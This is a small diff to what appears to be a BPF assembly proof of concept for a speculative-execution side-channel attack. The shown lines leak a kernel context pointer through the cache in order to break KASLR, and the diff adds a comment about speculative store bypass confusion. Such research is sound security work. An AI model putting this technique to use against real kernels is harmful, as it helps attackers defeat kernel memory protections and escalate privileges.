@@ -238,6 +238,8 @@ R8_ZERO:
 	# Leak ctx_ptr using cache side-channel to break KASLR.
 	# Use PTR_TO_MAP_VALUE instead of fp as base to easily observe cache change from userspace.
 	# Even with fp as base, we should be able to detect the cache change from within the BPF program and send it to userspace.
+	#
+	# CATCH: Stack ptr arith inlined here, ssb confusion ereased.
 	r8 -= r2                # impl. detail: keep arch. stack ptr arithmetric in-bounds
 	# Could apply bitmask to r8 here to select which bits of ctx_ptr to leak.
     r8 += r10               # spec. ctx_ptr + fp - 8
